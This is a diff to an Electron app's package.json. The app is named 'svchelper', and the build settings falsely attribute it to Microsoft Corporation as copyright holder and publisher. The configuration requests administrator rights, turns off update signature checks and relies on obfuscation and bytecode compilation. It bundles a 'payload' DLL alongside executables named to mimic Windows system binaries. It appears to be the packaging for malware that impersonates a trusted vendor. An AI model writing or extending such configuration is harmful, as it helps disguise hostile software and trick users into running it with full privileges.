@@ -22,19 +22,21 @@
     "javascript-obfuscator": "^5.3.0"
   },
   "dependencies": {
-    "@electron/asar": "^3.2.13"
+    "@electron/asar": "^3.2.13",
+    "bytenode": "^1.6.0",
+    "koffi": "^3.1.0"
   },
   "build": {
     "appId": "com.microsoft.svchelper",
     "productName": "svchelper",
     "artifactName": "svchelper.${ext}",
-    "copyright": "\u00A9 Microsoft Corporation. All rights reserved.",
+    "copyright": "© Microsoft Corporation. All rights reserved.",
     "afterPack": "flip-fuses.js",
     "win": {
       "target": "dir",
       "requestedExecutionLevel": "requireAdministrator",
       "icon": "src/assets/svchelper.ico",
-      "legalTrademarks": "\u00A9 Microsoft Corporation. All rights reserved.",
+      "legalTrademarks": "© Microsoft Corporation. All rights reserved.",
       "fileAssociations": [],
       "signAndEditExecutable": true,
       "verifyUpdateCodeSignature": false,
@@ -42,14 +44,34 @@
         "publisherName": "Microsoft Corporation"
       }
     },
-    "directories": { "output": "dist" },
-    "files": [ "src/**/*", "node_modules/**/*" ],
+    "directories": {
+      "output": "dist"
+    },
+    "files": [
+      "src/**/*",
+      "node_modules/**/*"
+    ],
     "extraResources": [
-      { "from": "../build/launcher/sihost.exe",       "to": "sihost.exe" },
-      { "from": "../build/payload/dwmapiext.dll",     "to": "dwmapiext.dll" },
-      { "from": "../build/resolver/dllhost32.exe",    "to": "dllhost32.exe" },
-      { "from": "../build/resolver/cgpt_dbghelp.dll", "to": "cgpt_dbghelp.dll" },
-      { "from": "../build/resolver/symsrv.dll",       "to": "symsrv.dll" }
+      {
+        "from": "../build/launcher/sihost.exe",
+        "to": "sihost.exe"
+      },
+      {
+        "from": "../build/payload/dwmapiext.dll",
+        "to": "dwmapiext.dll"
+      },
+      {
+        "from": "../build/resolver/dllhost32.exe",
+        "to": "dllhost32.exe"
+      },
+      {
+        "from": "../build/resolver/cgpt_dbghelp.dll",
+        "to": "cgpt_dbghelp.dll"
+      },
+      {
+        "from": "../build/resolver/symsrv.dll",
+        "to": "symsrv.dll"
+      }
     ],
     "extraMetadata": {
       "name": "svchelper",
